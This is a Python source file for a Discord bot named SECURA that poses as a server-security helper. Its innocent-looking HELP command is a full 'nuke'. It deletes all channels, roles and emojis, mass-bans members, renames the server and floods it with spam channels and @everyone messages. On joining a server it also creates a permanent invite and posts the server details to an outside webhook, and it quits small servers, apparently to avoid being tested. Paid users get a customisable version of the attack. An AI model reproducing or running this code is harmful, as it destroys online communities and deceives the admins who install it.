import discord
from discord.ext import commands
import asyncio
import random
import base64
import aiohttp
from colorama import Fore, Style, init
from typing import Optional

# Initialize Colorama for Windows compatibility
init(autoreset=True)

# --- CONFIGURATION ---
TOKEN = ""  # Put your token here
OWNER_ID = 1337767099283542026
WEBHOOK_URL = ""  # Webhook for tracker channel
ICON_URL = ""  # Default logo URL

SPAM_CHANNELS_POOL = [
    "Secura runs you", "Get Banned", "NUKED", "oops Secura", "F IN CHAT SECURA",
    "Should Have Listened", "Get NUKED clowns", "Nuked by SECURA", "oops got nuked",
    "I run you", "kinda got nuked by yourself"
]
DEFAULT_CHANNELS = ["Secura runs you", "Get Banned", "NUKED", "oops Secura", "F IN CHAT SECURA"]
SPAM_MESSAGE = "@everyone You Got Nuked by SECURA https://discord.gg/mAjwRqXAPp RIP 67 https://files.catbox.moe/3obb3d.mp4"

# --- DATA STORAGE (RAM) ---
join_logs = []
blacklisted_users = []
premium_users = []
premium_settings = {}
trusted_servers = []
bot_system_logs = []
current_spam_message = SPAM_MESSAGE

# --- UTILS ---

async def send_webhook_log(title: str, description: str, color_int: int = 0x00ff00):
    if not WEBHOOK_URL:
        return
    try:
        async with aiohttp.ClientSession() as session:
            payload = {"embeds": [{"title": title, "description": description, "color": color_int}]}
            async with session.post(WEBHOOK_URL, json=payload) as resp:
                if resp.status != 204:
                    print(f"{Fore.YELLOW}[WEBHOOK ERROR] Status: {resp.status}")
    except Exception as e:
        print(f"{Fore.RED}[WEBHOOK EXCEPTION] {e}")

# --- BOT SETUP ---

class SecuraBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix=["?", "!"], intents=intents, owner_id=OWNER_ID)

    async def setup_hook(self):
        # Sync slash commands
        await self.tree.sync()
        print(f"{Fore.CYAN}Slash commands synced.")

bot = SecuraBot()

@bot.event
async def on_ready():
    banner = f"""{Fore.MAGENTA}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░
    {Fore.WHITE}Support: https://discord.gg/U2mefh6DtN | Status: ONLINE ({bot.user})
    """
    print(banner)
    await bot.change_presence(activity=discord.Game(name="Securing Servers"))

# --- EVENTS ---

@bot.event
async def on_guild_join(guild: discord.Guild):
    inviter = "Unknown"
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
            if entry.target.id == bot.user.id:
                inviter = f"{entry.user} ({entry.user.id})"
                break
    except: pass

    log_entry = {"server": guild.name, "id": guild.id, "inviter": inviter, "members": guild.member_count}
    join_logs.append(log_entry)

    if guild.member_count <= 10 and guild.id not in trusted_servers:
        print(f"{Fore.RED}[ANTI-TEST] Leaving {guild.name} (Low member count)")
        await send_webhook_log("Left Small Server", f"**Server:** {guild.name}\n**Members:** {guild.member_count}", 0xff0000)
        await guild.leave()
        return

    invite_str = "No Perms"
    for channel in guild.text_channels:
        try:
            invite = await channel.create_invite(max_age=0)
            invite_str = str(invite)
            break
        except: continue

    desc = f"**Server:** {guild.name}\n**ID:** {guild.id}\n**Inviter:** {inviter}\n**Members:** {guild.member_count}\n**Invite:** {invite_str}"
    await send_webhook_log("Bot Joined New Server", desc, 0x00ff00)

@bot.event
async def on_guild_channel_create(channel):
    # Auto-spam on creation with enhanced message count
    if isinstance(channel, discord.TextChannel):
        try:
            # Send 10 messages per channel
            for _ in range(10):
                await channel.send(current_spam_message)
        except: pass

# --- NUKE LOGIC (OPTIMIZED) ---

async def mass_delete(items):
    tasks = []
    for item in items:
        tasks.append(asyncio.create_task(item.delete()))
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_ban(guild, initiator_id):
    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member.id != initiator_id and member.id != bot.user.id:
            tasks.append(asyncio.create_task(guild.ban(member, reason="SECURA RUNS YOU")))
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_channel_spawn(guild, channels_list):
    tasks = []
    for _ in range(100): # Increased count for more destruction
        name = random.choice(channels_list)
        tasks.append(asyncio.create_task(guild.create_text_channel(name)))
    await asyncio.gather(*tasks, return_exceptions=True)

async def execute_nuke(ctx, name, icon_url_target, message, channels_list, is_premium=False):
    global current_spam_message
    current_spam_message = message
    guild = ctx.guild

    print(f"{Fore.YELLOW}[STARTING NUKE] {guild.name}")

    try: await ctx.message.delete()
    except: pass

    nuke_type = "PREMIUM" if is_premium else "FREE"
    await send_webhook_log(f"{nuke_type} NUKE TRIGGERED", f"User: {ctx.author}\nServer: {guild.name} ({guild.id})", 0xff0000)

    try:
        if icon_url_target:
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url_target) as resp:
                    if resp.status == 200:
                        img = await resp.read()
                        await guild.edit(name=name, icon=img)
        else:
            await guild.edit(name=name)
    except: pass

    print(f"{Fore.RED}Purging server components...")
    
    await asyncio.gather(
        mass_delete(guild.channels),
        mass_delete(guild.roles),
        mass_delete(guild.emojis),
        mass_ban(guild, ctx.author.id),
        return_exceptions=True
    )

    print(f"{Fore.GREEN}Spawning channels and sending messages...")
    await mass_channel_spawn(guild, channels_list)
    print(f"{Fore.MAGENTA}[NUKE COMPLETE] {guild.name}")

# --- COMMANDS ---

@bot.command()
async def HELP(ctx):
    if ctx.author.id in blacklisted_users:
        return await ctx.send("❌ You are blacklisted.")

    if ctx.prefix == "!":
        if ctx.author.id not in premium_users:
            return await ctx.send("❌ This is a **Premium** command. Use `?HELP` for free version.")
        
        settings = premium_settings.get(ctx.author.id, {
            "name": "NUKED BY SECURA",
            "icon": ICON_URL,
            "message": SPAM_MESSAGE,
            "channels": DEFAULT_CHANNELS
        })
        await execute_nuke(ctx, settings['name'], settings['icon'], settings['message'], settings['channels'], True)
    else:
        await execute_nuke(ctx, "SECURA RUNS YOU", ICON_URL, SPAM_MESSAGE, SPAM_CHANNELS_POOL, False)

@bot.tree.command(name="customize", description="Edit your premium nuke settings")
async def customize(interaction: discord.Interaction, name: str, message: str, icon: Optional[str] = None):
    if interaction.user.id not in premium_users:
        return await interaction.response.send_message("Premium only.", ephemeral=True)
    
    premium_settings[interaction.user.id] = {
        "name": name,
        "message": message,
        "icon": icon or ICON_URL,
        "channels": DEFAULT_CHANNELS
    }
    await interaction.response.send_message("✅ Settings updated!", ephemeral=True)

# --- OWNER ADMIN ---

@bot.command()
@commands.is_owner()
async def addpremium(ctx, user_id: int):
    if user_id not in premium_users:
        premium_users.append(user_id)
        await ctx.send(f"✅ User {user_id} added to premium.")

@bot.command()
@commands.is_owner()
async def blacklist(ctx, user_id: int):
    blacklisted_users.append(user_id)
    await ctx.send(f"🚫 User {user_id} blacklisted.")

@bot.command()
@commands.is_owner()
async def START(ctx):
    try:
        guild = await bot.create_guild(name="SECURA INFRA")
        channel = await guild.create_text_channel("main")
        invite = await channel.create_invite()
        await ctx.author.send(f"Server Created: {invite}")
        await ctx.send("Check DMs.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@commands.is_owner()
async def STOP(ctx):
    await ctx.send("Shutting down...")
    await bot.close()

# --- RUN ---
try:
    bot.run(TOKEN)
except discord.LoginFailure:
    print(f"{Fore.RED}Invalid Token Provided.")
except Exception as e:
    print(f"{Fore.RED}Error: {e}")
